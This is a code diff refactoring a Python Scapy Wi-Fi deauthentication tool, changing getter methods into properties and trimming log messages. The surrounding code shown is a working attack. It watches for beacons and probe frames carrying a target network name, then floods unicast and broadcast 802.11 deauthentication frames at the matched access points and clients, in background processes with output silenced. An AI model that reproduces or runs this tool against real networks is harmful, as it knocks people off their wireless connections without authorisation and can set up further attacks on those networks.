@@ -54,7 +54,8 @@ class AccessPoints:
         for bssid in self._bssids:
             yield bssid
     
-    def get_essid(self) -> str:
+    @property
+    def essid(self) -> str:
       return self._essid
     
     def add(self, bssid: str) -> None:
@@ -87,13 +88,16 @@ class DeauthConfig:
         self._broadcast_enabled = broadcast_enabled
         self._deauth_rounds = deauth_rounds
     
-    def get_interface(self) -> str:
+    @property
+    def wifi_interface(self) -> str:
         return self._wifi_interface
     
-    def get_broadcast(self) -> bool:
+    @property
+    def broadcast_enabled(self) -> bool:
         return self._broadcast_enabled
     
-    def get_rounds(self) -> int:
+    @property
+    def deauth_rounds(self) -> int:
         return self._deauth_rounds
 
 def print_info(message: str) -> None:
@@ -140,7 +144,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
     try:
         def unicast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(deauth_config.get_rounds()):
+            for i in range(deauth_config.deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                         dot11.Dot11(
@@ -149,7 +153,7 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                             addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = deauth_config.get_interface(),
+                    iface = deauth_config.wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
@@ -161,18 +165,18 @@ def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                             addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = deauth_config.get_interface(),
+                    iface = deauth_config.wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = unicast_deauth_parallel).start()
         print_info(
-            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
-            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...'
+            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta}'
         )
         print_info(
-            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
-            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...'
+            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap}'
         )
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
@@ -183,7 +187,7 @@ def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str)
     try:
         def broadcast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(deauth_config.get_rounds()):
+            for i in range(deauth_config.deauth_rounds):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                         dot11.Dot11(
@@ -192,14 +196,14 @@ def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str)
                             addr3 = bssid_net,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = deauth_config.get_interface(),
+                    iface = deauth_config.wifi_interface,
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = broadcast_deauth_parallel).start()
         print_info(
-            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT} broadcast'
-            f' deauthentication frames from AP {bssid_ap} ...'
+            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT} broadcast'
+            f' deauthentication frames from AP {bssid_ap}'
         )
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
@@ -219,9 +223,9 @@ def handle_beacon_proberesp(frame: dot11.Dot11, deauth_config: DeauthConfig,
             dot11_element = frame.getlayer(dot11.Dot11Elt)
             while dot11_element:
                 if dot11_element.ID == 0:
-                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
+                    if dot11_element.info == bytes(aps_targetlist.essid, 'utf-8'):
                         aps_targetlist.add(bssid_src)
-                        if deauth_config.get_broadcast():
+                        if deauth_config.broadcast_enabled:
                             broadcast_deauth(deauth_config, bssid_src, bssid_net)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
@@ -243,9 +247,9 @@ def handle_probereq(frame: dot11.Dot11, deauth_config: DeauthConfig,
             dot11_element = frame.getlayer(dot11.Dot11Elt)
             while dot11_element:
                 if dot11_element.ID == 0:
-                    if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
+                    if dot11_element.info == bytes(aps_targetlist.essid, 'utf-8'):
                         aps_targetlist.add(bssid_dst)
-                        if deauth_config.get_broadcast():
+                        if deauth_config.broadcast_enabled:
                             broadcast_deauth(deauth_config, bssid_dst, bssid_net)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
@@ -376,7 +380,7 @@ def main() -> None:
         aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
         aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
         stations = Stations(args.essid)
-        if deauth_config.get_broadcast():
+        if deauth_config.broadcast_enabled:
             for bssid in aps_targetlist:
                 broadcast_deauth(deauth_config, bssid, bssid)
         sendrecv.sniff(
